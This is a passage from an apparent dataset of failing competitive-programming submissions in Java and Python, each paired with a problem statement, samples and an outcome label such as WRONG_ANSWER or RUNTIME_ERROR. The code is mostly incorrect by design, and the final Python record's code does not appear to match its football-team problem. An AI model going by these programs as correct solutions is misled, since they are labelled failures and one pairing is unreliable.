cnt[u]=ans;\n\t}\n\t\n\tstatic class SuffixAutomaton {\n\t\tint [] link,len;\n\t\tTreeMap<Character, Integer> [] nxt;\n\t\tint lst, idx;\n\t\t\n\t\tSuffixAutomaton(char [] s){\n\t\t\tint n=s.length;\n\t\t\tlink=new int [n<<1];\n\t\t\tlen=new int [n<<1];\n\t\t\tnxt=new TreeMap [n<<1];\n\t\t\tnxt[0]=new TreeMap<Character, Integer>();\n\t\t\tfor(char c : s)\n\t\t\t\taddLeter(c);\n\t\t}\n\t\t\n\t\tvoid addLeter(char c){\n\t\t\tint cur = ++idx;\n\t\t\tint p=lst;\n\t\t\twhile(!nxt[p].containsKey(c)){\n\t\t\t\tnxt[p].put(c, cur);\n\t\t\t\tp=link[p];\n\t\t\t}\n\t\t\tint q=nxt[p].get(c);\n\t\t\t\n\t\t\t\/\/ a node containing an edge with character c stopped me and it is not the root\n\t\t\tif(q!=cur){\n\t\t\t\tif(len[q]==len[p]+1)\n\t\t\t\t\tlink[cur]=q;\n\t\t\t\telse{\n\t\t\t\t\tint clone=++idx;\n\t\t\t\t\tlen[clone]=len[p]+1;\n\t\t\t\t\tlink[clone]=link[q];\n\t\t\t\t\tnxt[clone]=new TreeMap<Character, Integer>(nxt[q]);\n\t\t\t\t\tlink[cur]=link[q]=clone;\n\t\t\t\t\twhile(nxt[p].get(c)==q){\n\t\t\t\t\t\tnxt[p].put(c, clone);\n\t\t\t\t\t\tp=link[p];\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tlen[cur]=len[lst]+1;\n\t\t\tnxt[cur]=new TreeMap<Character, Integer>();\n\t\t\tlst=cur;\n\t\t}\n\t\t\n\t}\n\t\n\tstatic class MyScanner {\n\t\tBufferedReader br;\n\t\tStringTokenizer st;\n\t\tpublic MyScanner() {\n\t\t\tbr = new BufferedReader(new InputStreamReader(System.in));\n\t\t}\n\t\tString next() {while (st == null || !st.hasMoreElements()) {\n\t\t\ttry {st = new StringTokenizer(br.readLine());}\n\t\t\tcatch (IOException e) {e.printStackTrace();}}\n\t\treturn st.nextToken();}\n\t\tint nextInt() {return Integer.parseInt(next());}\n\t\tlong nextLong() {return Long.parseLong(next());}\n\t\tdouble nextDouble() {return Double.parseDouble(next());}\n\t\tString nextLine(){String str = \"\";\n\t\ttry {str = br.readLine();}\n\t\tcatch (IOException e) {e.printStackTrace();}\n\t\treturn str;}\n\t}\n} ","description":"You are given a string s. Each pair of numbers l and r that fulfill the condition 1\u2009\u2264\u2009l\u2009\u2264\u2009r\u2009\u2264\u2009|s|, correspond to a substring of the string s, starting in the position l and ending in the position r (inclusive).Let's define the function of two strings F(x,\u2009y) like this. We'll find a list of such pairs of numbers for which the corresponding substrings of string x are equal to string y. Let's sort this list of pairs according to the pair's first number's increasing. The value of function F(x,\u2009y) equals the number of non-empty continuous sequences in the list.For example: F(babbabbababbab,\u2009babb)\u2009=\u20096. The list of pairs is as follows:(1,\u20094),\u2009(4,\u20097),\u2009(9,\u200912)Its continuous sequences are:   (1,\u20094)  (4,\u20097)  (9,\u200912)  (1,\u20094),\u2009(4,\u20097)  (4,\u20097),\u2009(9,\u200912)  (1,\u20094),\u2009(4,\u20097),\u2009(9,\u200912) Your task is to calculate for the given string s the sum F(s,\u2009x) for all x, that x belongs to the set of all substrings of a string s.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains the given string s, consisting only of small Latin letters (1\u2009\u2264\u2009|s|\u2009\u2264\u2009105).","output_spec":"Print the single number \u2014 the sought sum. Please do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specificator.","notes":"NoteIn the first sample the function values at x equal to \"a\", \"aa\", \"aaa\" and \"aaaa\" equal 10, 6, 3 and 1 correspondingly.In the second sample for any satisfying x the function value is 1.","sample_inputs":["aaaa","abcdef","abacabadabacaba"],"sample_outputs":["20","21","188"]}
{"difficulty":1900,"lang":"Java 8","lang_cluster":"java","src_uid":"e05ef33935d04bd3714269268aceda41","submission_id":"re_1372","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.util.Arrays;\nimport java.util.Stack;\nimport java.util.StringTokenizer;\n\npublic class D {\n\tstatic char[] s;\n\tstatic int n, cor[];\n\tstatic int[][][][] memo;\n\tstatic int mod = (int) 1e9 + 7;\n\n\tstatic int dp(int i, int j, int ci, int cj) {\n\t\tif (i >= j)\n\t\t\treturn 1;\n\t\tif (memo[i][j][ci][cj] != -1)\n\t\t\treturn memo[i][j][ci][cj];\n\t\tlong res = 0;\n\t\tif(j != cor[i] || cj != 2)\n\t\t\tres = (res + 1l*dp(i+1, cor[i]-1, ci, 2)*dp(cor[i]+1, j, 2, cj)%mod) % mod;\n\t\tif(j != cor[i] || cj != 1)\n\t\t\tres = (res + 1l*dp(i+1, cor[i]-1, ci, 1)*dp(cor[i]+1, j, 1, cj)%mod) % mod;\n\t\tif(ci == 0){\n\t\t\tres = (res + 1l*dp(i+1, cor[i]-1, 1, 0)*dp(cor[i]+1, j, 0, cj)%mod) % mod;\n\t\t\tres = (res + 1l*dp(i+1, cor[i]-1, 2, 0)*dp(cor[i]+1, j, 0, cj)%mod) % mod;\n\t\t}\n\t\telse{\n\t\t\tres = (res + 1l*dp(i+1, cor[i]-1, ci==1?2:1, 0)*dp(cor[i]+1, j, 0, cj)%mod) % mod;\n\t\t}\n\/\/\t\tSystem.out.println(i + \" \" + j + \" \" + ci + \" \" + cj + \" \" + res);\n\t\treturn memo[i][j][ci][cj] = (int) res;\n\t}\n\n\tpublic static void main(String[] args) throws NumberFormatException, IOException {\n\t\tScanner sc = new Scanner();\n\t\tPrintWriter out = new PrintWriter(System.out);\n\t\ts = sc.next().toCharArray();\n\t\tn = s.length;\n\t\tmemo = new int[n + 1][n + 1][3][3];\n\t\tfor (int[][][] i : memo)\n\t\t\tfor (int[][] j : i)\n\t\t\t\tfor (int[] k : j)\n\t\t\t\t\tArrays.fill(k, -1);\n\t\tcor = new int[n];\n\t\tStack<Integer> st = new Stack<>();\n\t\tfor (int i = 0; i < s.length; i++) {\n\t\t\tif (s[i] == '(')\n\t\t\t\tst.add(i);\n\t\t\telse {\n\t\t\t\tint tmp = st.pop();\n\t\t\t\tcor[i] = tmp;\n\t\t\t\tcor[tmp] = i;\n\t\t\t}\n\t\t}\n\/\/\t\tSystem.out.println(Arrays.toString(cor));\n\t\tout.println(dp(0, n-1, 0, 0));\n\t\tout.flush();\n\t\tout.close();\n\t}\n\n\tstatic class Scanner {\n\t\tBufferedReader bf;\n\t\tStringTokenizer st;\n\n\t\tpublic Scanner() {\n\t\t\tbf = new BufferedReader(new InputStreamReader(System.in));\n\t\t}\n\n\t\tpublic String next() throws IOException {\n\t\t\twhile (st == null || !st.hasMoreTokens())\n\t\t\t\tst = new StringTokenizer(bf.readLine());\n\t\t\treturn st.nextToken();\n\t\t}\n\n\t\tpublic int nextInt() throws NumberFormatException, IOException {\n\t\t\treturn Integer.parseInt(next());\n\t\t}\n\n\t\tpublic double nextDouble() throws NumberFormatException, IOException {\n\t\t\treturn Double.parseDouble(next());\n\t\t}\n\n\t\tpublic long nextLong() throws NumberFormatException, IOException {\n\t\t\treturn Long.parseLong(next());\n\t\t}\n\t}\n}\n","description":"Once Petya read a problem about a bracket sequence. He gave it much thought but didn't find a solution. Today you will face it.You are given string s. It represents a correct bracket sequence. A correct bracket sequence is the sequence of opening (\"(\") and closing (\")\") brackets, such that it is possible to obtain a correct mathematical expression from it, inserting numbers and operators between the brackets. For example, such sequences as \"(())()\" and \"()\" are correct bracket sequences and such sequences as \")()\" and \"(()\" are not.In a correct bracket sequence each bracket corresponds to the matching bracket (an opening bracket corresponds to the matching closing bracket and vice versa). For example, in a bracket sequence shown of the figure below, the third bracket corresponds to the matching sixth one and the fifth bracket corresponds to the fourth one.   You are allowed to color some brackets in the bracket sequence so as all three conditions are fulfilled:   Each bracket is either not colored any color, or is colored red, or is colored blue.  For any pair of matching brackets exactly one of them is colored. In other words, for any bracket the following is true: either it or the matching bracket that corresponds to it is colored.  No two neighboring colored brackets have the same color. Find the number of different ways to color the bracket sequence. The ways should meet the above-given conditions. Two ways of coloring are considered different if they differ in the color of at least one bracket. As the result can be quite large, print it modulo 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the single string s (2\u2009\u2264\u2009|s|\u2009\u2264\u2009700) which represents a correct bracket sequence. ","output_spec":"Print the only number \u2014 the number of ways to color the bracket sequence that meet the above given conditions modulo 1000000007 (109\u2009+\u20097).","notes":"NoteLet's consider the first sample test. The bracket sequence from the sample can be colored, for example, as is shown on two figures below.     The two ways of coloring shown below are incorrect.     ","sample_inputs":["(())","(()())","()"],"sample_outputs":["12","40","4"]}
{"difficulty":2400,"lang":"Java 6","lang_cluster":"java","src_uid":"e9db8d048e9763cf38c584342dea9f53","submission_id":"re_598","tags":["dp","bitmasks"],"exec_outcome":"COMPILATION_ERROR","source_code":"\/\/package round83;\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.util.Arrays;\n\npublic class C3 {\n\tInputStream is;\n\tPrintWriter out;\n\tString INPUT = \"\";\n\t\n\tvoid solve()\n\t{\n\t\tint n = ni();\n\t\tlong y = nl()-2001;\n\t\tint m = ni();\n\t\t\n\t\tint[][] lt = new int[m][2];\n\t\tfor(int i = 0;i < m;i++){\n\t\t\tlt[i][0] = ni() - 1;\n\t\t\tlt[i][1] = ni() - 1;\n\t\t}\n\t\t\n\t\tint[] a = new int[n];\n\t\tint used = 0;\n\t\touter:\n\t\tfor(int i = 0;i < n;i++){\n\t\t\tinner:\n\t\t\tfor(int j = 0;j < n;j++){\n\t\t\t\tif(used<<31-j>=0){\n\t\t\t\t\ta[i] = j;\n\t\t\t\t\tfor(int k = 0;k < m;k++){\n\t\t\t\t\t\tif(lt[k][0] <= i && lt[k][1] <= i && a[lt[k][0]] > a[lt[k][1]])continue inner;\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tint L = n-i-1;\n\t\t\t\t\tlong[] dp = new long[1<<L]; \/\/ position\n\t\t\t\t\tdp[0] = 1;\n\t\t\t\t\tint[] left = new int[n];\n\t\t\t\t\tint lp = 0;\n\t\t\t\t\tfor(int k = 0;k < n;k++){\n\t\t\t\t\t\tif(used<<31-k>=0)left[lp++] = k;\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tfor(int k = 1;k < 1<<L;k++){\n\t\t\t\t\t\tint h = Integer.bitCount(k)-1;\n\t\t\t\t\t\tiinner:\n\t\t\t\t\t\tfor(int l = 0;l < L;l++){\n\t\t\t\t\t\t\tif(k<<31-l<0){\n\t\t\t\t\t\t\t\tfor(int f = 0;f < m;f++){\n\t\t\t\t\t\t\t\t\tif(lt[f][0] <= i && lt[f][1] == i+1+l && a[lt[f][0]] > left[h])continue iinner;\n\t\t\t\t\t\t\t\t\tif(lt[f][0] == i+l+1 && lt[f][1] <= i && left[h] > a[lt[f][1]])continue iinner;\n\t\t\t\t\t\t\t\t\tif(lt[f][0] == i+l+1 && lt[f][1] > i && k<<31-(lt[f][1]-(i+1))<0)continue iinner;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tdp[k] += dp[k^1<<l];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tlong v = dp[(1<<L)-1];\n\t\t\t\t\tif(y < v){\n\t\t\t\t\t\tused |= 1<<j;\n\t\t\t\t\t\tcontinue outer;\n\t\t\t\t\t}else{\n\t\t\t\t\t\ty -= v;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tout.println(\"The times have changed\");\n\t\t\treturn;\n\t\t}\n\t\tfor(int i = 0;i < n;i++){\n\t\t\tif(i > 0)out.print(' ');\n\t\t\tout.print(a[i]+1);\n\t\t}\n\t\tout.println();\n\t}\n\t\n\tvoid run() throws Exception\n\t{\n\t\tis = oj ? System.in : new ByteArrayInputStream(INPUT.getBytes());\n\t\tout = new PrintWriter(System.out);\n\t\t\n\t\tlong s = System.currentTimeMillis();\n\t\tsolve();\n\t\tout.flush();\n\t\ttr(System.currentTimeMillis()-s+\"ms\");\n\t}\n\t\n\tpublic static void main(String[] args) throws Exception\n\t{\n\t\tnew C3().run();\n\t}\n\t\n\tpublic int ni()\n\t{\n\t\ttry {\n\t\t\tint num = 0;\n\t\t\tboolean minus = false;\n\t\t\twhile((num = is.read()) != -1 && !((num >= '0' && num <= '9') || num == '-'));\n\t\t\tif(num == '-'){\n\t\t\t\tnum = 0;\n\t\t\t\tminus = true;\n\t\t\t}else{\n\t\t\t\tnum -= '0';\n\t\t\t}\n\t\t\t\n\t\t\twhile(true){\n\t\t\t\tint b = is.read();\n\t\t\t\tif(b >= '0' && b <= '9'){\n\t\t\t\t\tnum = num * 10 + (b - '0');\n\t\t\t\t}else{\n\t\t\t\t\treturn minus ? -num : num;\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t}\n\t\treturn -1;\n\t}\n\t\n\tpublic long nl()\n\t{\n\t\ttry {\n\t\t\tlong num = 0;\n\t\t\tboolean minus = false;\n\t\t\twhile((num = is.read()) != -1 && !((num >= '0' && num <= '9') || num == '-'));\n\t\t\tif(num == '-'){\n\t\t\t\tnum = 0;\n\t\t\t\tminus = true;\n\t\t\t}else{\n\t\t\t\tnum -= '0';\n\t\t\t}\n\t\t\t\n\t\t\twhile(true){\n\t\t\t\tint b = is.read();\n\t\t\t\tif(b >= '0' && b <= '9'){\n\t\t\t\t\tnum = num * 10 + (b - '0');\n\t\t\t\t}else{\n\t\t\t\t\treturn minus ? -num : num;\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t}\n\t\treturn -1;\n\t}\n\t\n\tpublic String ns()\n\t{\n\t\ttry{\n\t\t\tint b = 0;\n\t\t\tStringBuilder sb = new StringBuilder();\n\t\t\twhile((b = is.read()) != -1 && (b == '\\r' || b == '\\n' || b == ' '));\n\t\t\tif(b == -1)return \"\";\n\t\t\tsb.append((char)b);\n\t\t\twhile(true){\n\t\t\t\tb = is.read();\n\t\t\t\tif(b == -1)return sb.toString();\n\t\t\t\tif(b == '\\r' || b == '\\n' || b == ' ')return sb.toString();\n\t\t\t\tsb.append((char)b);\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t}\n\t\treturn \"\";\n\t}\n\t\n\tpublic char[] ns(int n)\n\t{\n\t\tchar[] buf = new char[n];\n\t\ttry{\n\t\t\tint b = 0, p = 0;\n\t\t\twhile((b = is.read()) != -1 && (b == ' ' || b == '\\r' || b == '\\n'));\n\t\t\tif(b == -1)return null;\n\t\t\tbuf[p++] = (char)b;\n\t\t\twhile(p < n){\n\t\t\t\tb = is.read();\n\t\t\t\tif(b == -1 || b == ' ' || b == '\\r' || b == '\\n')break;\n\t\t\t\tbuf[p++] = (char)b;\n\t\t\t}\n\t\t\treturn Arrays.copyOf(buf, p);\n\t\t} catch (IOException e) {\n\t\t}\n\t\treturn null;\n\t}\n\t\n\t\n\tdouble nd() { return Double.parseDouble(ns()); }\n\tboolean oj = System.getProperty(\"ONLINE_JUDGE\") != null;\n\tvoid tr(Object... o) { if(!oj)System.out.println(Arrays.deepToString(o)); }\n}\n","description":"In the year 2500 the annual graduation ceremony in the German University in Cairo (GUC) has run smoothly for almost 500 years so far.The most important part of the ceremony is related to the arrangement of the professors in the ceremonial hall.Traditionally GUC has n professors. Each professor has his seniority level. All seniorities are different. Let's enumerate the professors from 1 to n, with 1 being the most senior professor and n being the most junior professor.The ceremonial hall has n seats, one seat for each professor. Some places in this hall are meant for more senior professors than the others. More specifically, m pairs of seats are in \"senior-junior\" relation, and the tradition requires that for all m pairs of seats (ai,\u2009bi) the professor seated in \"senior\" position ai should be more senior than the professor seated in \"junior\" position bi.GUC is very strict about its traditions, which have been carefully observed starting from year 2001. The tradition requires that:   The seating of the professors changes every year.  Year 2001 ceremony was using lexicographically first arrangement of professors in the ceremonial hall.  Each consecutive year lexicographically next arrangement of the professors is used. The arrangement of the professors is the list of n integers, where the first integer is the seniority of the professor seated in position number one, the second integer is the seniority of the professor seated in position number two, etc.Given n, the number of professors, y, the current year and m pairs of restrictions, output the arrangement of the professors for this year.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers n, y and m (1\u2009\u2264\u2009n\u2009\u2264\u200916,\u20092001\u2009\u2264\u2009y\u2009\u2264\u20091018,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009100) \u2014 the number of professors, the year for which the arrangement should be computed, and the number of pairs of seats for which the seniority relation should be kept, respectively. The next m lines contain one pair of integers each, \"ai bi\", indicating that professor on the ai-th seat is more senior than professor on the bi-th seat (1\u2009\u2264\u2009ai,\u2009bi\u2009\u2264\u2009n,\u2009ai\u2009\u2260\u2009bi). Some pair may be listed more than once. Please, do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is preferred to use the cin stream (you may also use the %I64d specificator).","output_spec":"Print the order in which the professors should be seated in the requested year. If by this year the GUC would have ran out of arrangements, or the given \"senior-junior\" relation are contradictory, print \"The times have changed\" (without quotes).","notes":"NoteIn the first example the lexicographically first order of seating is 1 2 3.In the third example the GUC will run out of arrangements after the year 3630800.In the fourth example there are no valid arrangements for the seating.The lexicographical comparison of arrangements is performed by the &lt; operator in modern programming languages. The arrangement a is lexicographically less that the arrangement b, if there exists such i (1\u2009\u2264\u2009i\u2009\u2264\u2009n), that ai\u2009&lt;\u2009bi, and for any j (1\u2009\u2264\u2009j\u2009&lt;\u2009i) aj\u2009=\u2009bj.","sample_inputs":["3 2001 2\n1 2\n2 3","7 2020 6\n1 2\n1 3\n2 4\n2 5\n3 6\n3 7","10 3630801 0","3 2001 3\n1 2\n2 3\n3 1"],"sample_outputs":["1 2 3","1 2 3 7 4 6 5","The times have changed","The times have changed"]}
{"difficulty":1700,"lang":"Java 8","lang_cluster":"java","src_uid":"f256235c0b2815aae85a6f9435c69dac","submission_id":"re_549","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.util.StringTokenizer;\n\npublic class A {\n\t\t\n\tpublic static void main(String[] args) throws IOException {\n\n\t\tScanner sc = new Scanner(System.in);\n\t\tPrintWriter out = new PrintWriter(System.out);\n\n\t\tint n = sc.nextInt(), m = sc.nextInt(), a = sc.nextInt() - 1, b = sc.nextInt() - 1;\n\t\t\n\t\tif(a % m == 0 && b % m == m - 1)\n\t\t\tout.println(1);\n\t\telse if(a \/ m == b \/ m || a % m == 0 && b == n - 1)\n\t\t\tout.println(1);\n\t\telse if(a \/ m + 1 == b \/ m || a % m == b % m + 1 || a % m == 0 || b % m == m - 1)\n\t\t\tout.println(2);\n\t\telse\n\t\t\tout.println(3);\n\t\tout.flush();\n\t\tout.close();\n\t}\n\n\tstatic class Scanner \n\t{\n\t\tStringTokenizer st;\n\t\tBufferedReader br;\n\n\t\tpublic Scanner(InputStream s){  br = new BufferedReader(new InputStreamReader(s));}\n\n\t\tpublic String next() throws IOException \n\t\t{\n\t\t\twhile (st == null || !st.hasMoreTokens()) \n\t\t\t\tst = new StringTokenizer(br.readLine());\n\t\t\treturn st.nextToken();\n\t\t}\n\n\t\tpublic int nextInt() throws IOException {return Integer.parseInt(next());}\n\n\t\tpublic long nextLong() throws IOException {return Long.parseLong(next());}\n\n\t}\n} ","description":"Throughout Igor K.'s life he has had many situations worthy of attention. We remember the story with the virus, the story of his mathematical career and of course, his famous programming achievements. However, one does not always adopt new hobbies, one can quit something as well.This time Igor K. got disappointed in one of his hobbies: editing and voicing videos. Moreover, he got disappointed in it so much, that he decided to destroy his secret archive for good. Igor K. use Pindows XR operation system which represents files and folders by small icons. At that, m icons can fit in a horizontal row in any window.Igor K.'s computer contains n folders in the D: disk's root catalog. The folders are numbered from 1 to n in the order from the left to the right and from top to bottom (see the images). At that the folders with secret videos have numbers from a to b inclusive. Igor K. wants to delete them forever, at that making as few frame selections as possible, and then pressing Shift+Delete exactly once. What is the minimum number of times Igor K. will have to select the folder in order to select folders from a to b and only them? Let us note that if some selected folder is selected repeatedly, then it is deselected. Each selection possesses the shape of some rectangle with sides parallel to the screen's borders.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains four integers n, m, a, b (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009109, 1\u2009\u2264\u2009a\u2009\u2264\u2009b\u2009\u2264\u2009n). They are the number of folders in Igor K.'s computer, the width of a window and the numbers of the first and the last folders that need to be deleted.","output_spec":"Print a single number: the least possible number of times Igor K. will have to select the folders using frames to select only the folders with numbers from a to b.","notes":"NoteThe images below illustrate statement tests.The first test:In this test we can select folders 3 and 4 with out first selection, folders 5, 6, 7, 8 with our second selection and folder 9 with our third, last selection.The second test:In this test we can first select all folders in the first row (2, 3, 4, 5), then \u2014 all other ones.","sample_inputs":["11 4 3 9","20 5 2 20"],"sample_outputs":["3","2"]}
{"difficulty":1600,"lang":"Java 11","lang_cluster":"java","src_uid":"fbfc333ad4b0a750f654a00be84aea67","submission_id":"re_101","tags":["graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*;\nimport java.lang.*;\nimport java.io.*;\nimport java.text.*;\n\n\/* Name of the class has to be \"Main\" only if the class is public*\/\npublic class CF602C\n{\n    static class FastReader {\n        \n        BufferedReader br;\n        StringTokenizer st;\n        \n        public FastReader() {\n            br = new BufferedReader(new InputStreamReader(System.in));\n        }\n        \n        String next() {\n            while (st == null || !st.hasMoreElements()) {\n                try {\n                    st = new StringTokenizer(br.readLine());\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            return st.nextToken();\n        }\n        \n        int nextInt() {\n            return Integer.parseInt(next());\n        }\n        \n        long nextLong() {\n            return Long.parseLong(next());\n        }\n        \n        double nextDouble() {\n            return Double.parseDouble(next());\n        }\n        \n        String nextLine() {\n            String str = \"\";\n            try {\n                str = br.readLine();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            return str;\n        }\n    }\n    \n    static class Node {\n        \n        long pp;\n        long a, b;\n        \n        Node(long x, long y) {\n            a = x;\n            b = y;\n            pp = a * b;\n        }\n    }\n    static class Comp implements Comparator<Node> {\n        \n        public int compare(Node o1, Node o2) {\n            if (o1.pp > o2.pp) {\n                return 1;\n            } else {\n                return -1;\n            }\n        }\n    }\n    public static void main(String[] args) {\n        FastReader sc=new FastReader();\n        PrintWriter out=new PrintWriter(System.out);\n        \/\/your code starts here\n        int n=sc.nextInt();\n        LinkedList<Integer> adj[]=new LinkedList[n];\n        int m=sc.nextInt();\n        for(int i=0;i<n;i++) adj[i]=new LinkedList();\n        for(int i=0;i<m;i++) \n        {\n            int a=sc.nextInt()-1;\n            int b=sc.nextInt()-1;\n            \/\/ adding edges of undirected graph\n            adj[a].add(b);\n            adj[b].add(a); \n        }\n        if(m==0 || m==(n*(n-1)\/2)) {\n            out.println(-1); out.close(); return;\n        }\n        int[] dist=new int[n]; Arrays.fill(dist, Integer.MAX_VALUE);\n        dist[0]=0;\n        boolean visited[]=new boolean[n]; \n        Queue<Integer> pq=new LinkedList();\n        pq.add(0); visited[0]=true;\n        while(!pq.isEmpty())\n        {\n            int s=pq.poll();\n            visited[s]=true;\n            for(int node : adj[s])\n            {\n                if(visited[node]) continue;\n                visited[node]=true;\n                dist[node]=dist[s]+1;\n                pq.add(node);\n            }\n        }\n        \/\/for(int i:dist) out.print(i+\" \");\n         if(dist[n-1]==Integer.MAX_VALUE) out.println(-1);\n         else out.println(dist[n-1]);\n        out.close();\n    }\n}\n","description":"In Absurdistan, there are n towns (numbered 1 through n) and m bidirectional railways. There is also an absurdly simple road network\u00a0\u2014 for each pair of different towns x and y, there is a bidirectional road between towns x and y if and only if there is no railway between them. Travelling to a different town using one railway or one road always takes exactly one hour.A train and a bus leave town 1 at the same time. They both have the same destination, town n, and don't make any stops on the way (but they can wait in town n). The train can move only along railways and the bus can move only along roads.You've been asked to plan out routes for the vehicles; each route can use any road\/railway multiple times. One of the most important aspects to consider is safety\u00a0\u2014 in order to avoid accidents at railway crossings, the train and the bus must not arrive at the same town (except town n) simultaneously.Under these constraints, what is the minimum number of hours needed for both vehicles to reach town n (the maximum of arrival times of the bus and the train)? Note, that bus and train are not required to arrive to the town n at the same moment of time, but are allowed to do so.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers n and m (2\u2009\u2264\u2009n\u2009\u2264\u2009400, 0\u2009\u2264\u2009m\u2009\u2264\u2009n(n\u2009-\u20091)\u2009\/\u20092)\u00a0\u2014 the number of towns and the number of railways respectively. Each of the next m lines contains two integers u and v, denoting a railway between towns u and v (1\u2009\u2264\u2009u,\u2009v\u2009\u2264\u2009n, u\u2009\u2260\u2009v). You may assume that there is at most one railway connecting any two towns.","output_spec":"Output one integer\u00a0\u2014 the smallest possible time of the later vehicle's arrival in town n. If it's impossible for at least one of the vehicles to reach town n, output \u2009-\u20091.","notes":"NoteIn the first sample, the train can take the route  and the bus can take the route . Note that they can arrive at town 4 at the same time.In the second sample, Absurdistan is ruled by railwaymen. There are no roads, so there's no way for the bus to reach town 4.","sample_inputs":["4 2\n1 3\n3 4","4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4","5 5\n4 2\n3 5\n4 5\n5 1\n1 2"],"sample_outputs":["2","-1","3"]}
{"difficulty":1500,"lang":"Python 3","lang_cluster":"python","src_uid":"0937a7e2f912fc094cc4275fd47cd457","submission_id":"re_1032","tags":["sortings","greedy","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"\nfrom collections import defaultdict\nn, t = int(input()), input().split()\np = defaultdict(int)\nfor i in t:\n    p[i] += 1\nif len(p) < 3: print(0)\nelse:\n    q = list(p.items())\n    a, b = q[0][1], q[1][1]\n    x, y = 0, 1\n    if a < b: x, y, a, b = y, x, b, a\n    for i in range(2, len(q)):\n        if q[i][1] > b:\n            if q[i][1] > a: x, y, a, b = i, x, q[i][1], a\n            else: y, b = i, q[i][1]\n    k = n \/\/ 3\n    if a > k:\n        c, s = n - a - b, n - a\n        if c > b: q[x], q[y], k = (q[x][0], (s >> 1)), (q[y][0], b - (s & 1)), (s >> 1)\n        #(q[y][0], b - (s & 1)), (s >> 1)\n        else: q[x], q[y], k = (q[x][0], c), (q[y][0], c), c \n    q = [(int(x), y) for x, y in q]\n    q.sort(reverse = True)\n    p, n = [], 2 * k\n    for i in q:\n        p += [str(i[0]) + ' ']  * i[1]\n    print(k)\n    print('\\n'.join(p[i] + p[k + i] + p[n + i] for i in range(k)))\n    #mas facil estaba examen de Cappo","description":"Petya loves football very much, especially when his parents aren't home. Each morning he comes to the yard, gathers his friends and they play all day. From time to time they have a break to have some food or do some chores (for example, water the flowers).The key in football is to divide into teams fairly before the game begins. There are n boys playing football in the yard (including Petya), each boy's football playing skill is expressed with a non-negative characteristic ai (the larger it is, the better the boy plays). Let's denote the number of players in the first team as x, the number of players in the second team as y, the individual numbers of boys who play for the first team as pi and the individual numbers of boys who play for the second team as qi. Division n boys into two teams is considered fair if three conditions are fulfilled:  Each boy plays for exactly one team (x\u2009+\u2009y\u2009=\u2009n).  The sizes of teams differ in no more than one (|x\u2009-\u2009y|\u2009\u2264\u20091).  The total football playing skills for two teams differ in no more than by the value of skill the best player in the yard has. More formally: Your task is to help guys divide into two teams fairly. It is guaranteed that a fair division into two teams always exists.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009105) which represents the number of guys in the yard. The next line contains n positive space-separated integers, ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009104), the i-th number represents the i-th boy's playing skills. ","output_spec":"On the first line print an integer x \u2014 the number of boys playing for the first team. On the second line print x integers \u2014 the individual numbers of boys playing for the first team. On the third line print an integer y \u2014 the number of boys playing for the second team, on the fourth line print y integers \u2014 the individual numbers of boys playing for the second team. Don't forget that you should fulfil all three conditions: x\u2009+\u2009y\u2009=\u2009n, |x\u2009-\u2009y|\u2009\u2264\u20091, and the condition that limits the total skills. If there are multiple ways to solve the problem, print any of them. The boys are numbered starting from one in the order in which their skills are given in the input data. You are allowed to print individual numbers of boys who belong to the same team in any order.","notes":"NoteLet's consider the first sample test. There we send the first and the second boy to the first team and the third boy to the second team. Let's check all three conditions of a fair division. The first limitation is fulfilled (all boys play), the second limitation on the sizes of groups (|2\u2009-\u20091|\u2009=\u20091\u2009\u2264\u20091) is fulfilled, the third limitation on the difference in skills ((2\u2009+\u20091)\u2009-\u2009(1)\u2009=\u20092\u2009\u2264\u20092) is fulfilled.","sample_inputs":["3\n1 2 1","5\n2 3 3 1 1"],"sample_outputs":["2\n1 2 \n1\n3","3\n4 1 3 \n2\n5 2"]}
